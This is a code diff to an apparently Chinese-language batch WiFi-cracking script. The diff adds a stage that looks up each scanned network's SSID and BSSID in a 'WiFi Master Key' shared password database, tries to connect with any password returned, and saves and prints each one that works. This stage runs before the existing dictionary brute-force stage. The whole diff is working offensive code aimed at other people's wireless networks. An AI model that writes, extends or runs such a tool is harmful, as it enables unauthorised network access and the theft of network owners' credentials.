@@ -159,6 +159,7 @@ def scan_wifi_targets():
                         continue
                     targets.append({
                         "ssid": ssid,
+                        "bssid": n.get("bssid", ""),
                         "rssi": n.get("rssi", -100),
                         "channel": n.get("channel", 0),
                         "band": n.get("band", ""),
@@ -213,6 +214,7 @@ def scan_wifi_targets():
 
             targets.append({
                 "ssid": ssid,
+                "bssid": "",
                 "rssi": -60,  # 默认信号强度（已保存WiFi无法获取实时信号）
                 "channel": 0,
                 "band": "",
@@ -402,6 +404,65 @@ def batch_crack(targets, wordlists, interface="en0", delay=0.5,
     print(f"{'=' * 65}{RESET}")
     print()
 
+    # ============================================================
+    # 阶段0: WiFi万能钥匙密码库预查询（秒级）
+    # ============================================================
+    has_bssid = any(t.get("bssid") for t in targets)
+    if has_bssid:
+        print(f"{BOLD}{MAGENTA}  ── 阶段0: WiFi万能钥匙密码库查询（秒级） ──{RESET}")
+        print()
+        try:
+            sys.path.insert(0, str(SCRIPT_DIR))
+            from wifi_db_query import query_wifi_masterkey
+            _has_masterkey = True
+        except ImportError:
+            _has_masterkey = False
+            print(f"  {YELLOW}[!] 万能钥匙模块不可用（缺pycryptodome）{RESET}")
+
+        if _has_masterkey:
+            for t_idx, target in enumerate(targets):
+                ssid = target["ssid"]
+                bssid = target.get("bssid", "")
+                if not bssid:
+                    continue
+                cracked_data = load_cracked()
+                if ssid in cracked_data:
+                    continue
+
+                sys.stdout.write(f"\r  [{t_idx+1}/{total_targets}] {ssid:<24} 查询万能钥匙...")
+                sys.stdout.flush()
+
+                try:
+                    pwd = query_wifi_masterkey(ssid, bssid)
+                    if pwd:
+                        ok, _ = try_connect(ssid, pwd, interface)
+                        if ok:
+                            success_count += 1
+                            save_cracked(ssid, pwd)
+                            results.append((ssid, "成功", pwd, 0, 0))
+                            progress[ssid] = {
+                                "status": "cracked",
+                                "password": pwd,
+                                "tried": 0,
+                                "time": time.strftime("%Y-%m-%d %H:%M:%S"),
+                                "source": "万能钥匙",
+                            }
+                            save_batch_progress(progress)
+                            print()
+                            print(f"  {GREEN}{BOLD}>>> 万能钥匙命中！SSID: {ssid}  密码: {pwd}{RESET}")
+                            continue
+                except Exception:
+                    pass
+                sys.stdout.write(f"\r  [{t_idx+1}/{total_targets}] {ssid:<24} 万能钥匙未收录\n")
+
+            print()
+
+    # ============================================================
+    # 阶段1: 字典爆破
+    # ============================================================
+    print(f"{BOLD}{CYAN}  ── 阶段1: 字典爆破 ──{RESET}")
+    print()
+
     try:
         for t_idx, target in enumerate(targets):
             if interrupted[0]:
@@ -411,7 +472,7 @@ def batch_crack(targets, wordlists, interface="en0", delay=0.5,
             brand = target["brand"]
             difficulty = target["difficulty"]
 
-            # 跳过已破解
+            # 跳过已破解（包括万能钥匙阶段已命中的）
             cracked = load_cracked()
             if ssid in cracked:
                 skip_count += 1
